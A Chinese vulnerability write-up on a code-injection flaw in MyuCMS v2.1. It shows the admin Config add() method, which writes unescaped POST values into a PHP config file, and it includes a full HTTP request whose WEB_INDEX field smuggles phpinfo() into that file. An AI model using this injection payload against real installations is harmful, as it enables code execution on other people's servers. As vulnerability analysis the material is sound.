MyuCMS v2.1 命令执行漏洞
========================

一、漏洞简介
------------

二、漏洞影响
------------

MyuCMS v2.1

三、复现过程
------------

CNVD上没有说明存在的页面。我找到的是一处能控制 **extre/web.php**
内容的漏洞。

漏洞成因是使用 **file\_put\_contents** 函数更新 **extre**
下配置文件的内容时，未对参数内容做验证，而直接通过循环遍历，拼接到了php后缀的配置文件中。

相同原理漏洞影响3个文件共5处。分别为
**application/admin/controller/Config.php**，
**application/admin/controller/Muban.php**
，**application/admin/controller/Point.php**

此处以 **application/admin/controller/Config.php** 下的 **add()**
方法为例分析

    public function add()
        {
           $path = 'application/extra/web.php';
           $file = include $path;      // $file 的内容为 web.php 中返回的配置数组的值
           $config = array( // 读取 post 中提交的配置内容
             'WEB_RXT' => input('WEB_RXT'),
             'WEB_GL' => input('WEB_GL'),
             'WEB_REG' => input('WEB_REG'),
             'WEB_TAG' => input('WEB_TAG'),
             'WEB_OPE' => input('WEB_OPE'),
             'WEB_BUG' => input('WEB_BUG'),
             'WEB_BBS' => input('WEB_BBS'),
             'WEB_SHOP' => input('WEB_SHOP'),
             'WEB_INDEX' => input('WEB_INDEX'),
             'WEB_KEJIAN' => input('WEB_KEJIAN'),
             'WEB_KEJIANS' => input('WEB_KEJIANS'),
             'Cascade' => input('Cascade'),
             //七牛
             'bucket' => input('bucket'),
             'accessKey' => input('accessKey'),
             'secrectKey' => input('secrectKey'),
             'domain' => input('domain'),
             'qiniuopen' => input('qiniuopen'),
           );
            $res = array_merge($file, $config); // 合并两个数组
            $str = '<?php return [';
            foreach ($res as $key => $value) { // 循环数组，生成新的配置内容
                $str .= '\'' . $key . '\'' . '=>' . '\'' . $value . '\'' . ',';
            }
            $str .= ']; ';
            if (file_put_contents($path, $str)) { // 将配置内容写入 web.php 文件
                return json(array('code' => 200, 'msg' => '修改成功'));
            } else {
                return json(array('code' => 0, 'msg' => '修改失败'));
            }
        }

### Payload

Payload数据包如下：

    POST /admin/config/add.html HTTP/1.1
    Host: www.0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 327
    Origin: http://www.myu.io
    Connection: close
    Referer: http://www.myu.io/admin/config/index.html
    Cookie: PHPSESSID=l6ijpio06mqmhcdq654g63eq90; UM_distinctid=170343d2b4a291-0a4e487f247e62-4c302978-1fa400-170343d2b4b28f; CNZZDATA1277972876=1874892142-1581419669-%7C1581432904; XDEBUG_SESSION=XDEBUG_ECLIPSE

    WEB_KEJIAN=0&WEB_KEJIANS=0&WEB_INDEX=bbs',phpinfo(),'&WEB_RXT=rar,png,zip,jpg,gif,ico,7z&qiniuopen=0&secrectKey=0&accessKey=0&domain=0&bucket=0&Cascade=1&WEB_BUG=true&WEB_REG=1&WEB_OPE=1&WEB_GL=0&WEB_BBS=1&WEB_SHOP=1&WEB_TAG=%e6%8f%92%e4%bb%b6%2c%e5%bb%ba%e8%ae%ae%2c%e6%a8%a1%e6%9d%bf%2c%e7%ad%be%e5%88%b0%2c%e5%8f%8d%e9%a6%88

写入的内容和效果如下：

![11.jpg](/Users/aresx/Documents/VulWiki/.resource/MyuCMSv2.1命令执行漏洞/media/rId25.jpg)

![111.jpg](/Users/aresx/Documents/VulWiki/.resource/MyuCMSv2.1命令执行漏洞/media/rId26.jpg)

参考链接
--------

> https://xz.aliyun.com/t/7271\#toc-4
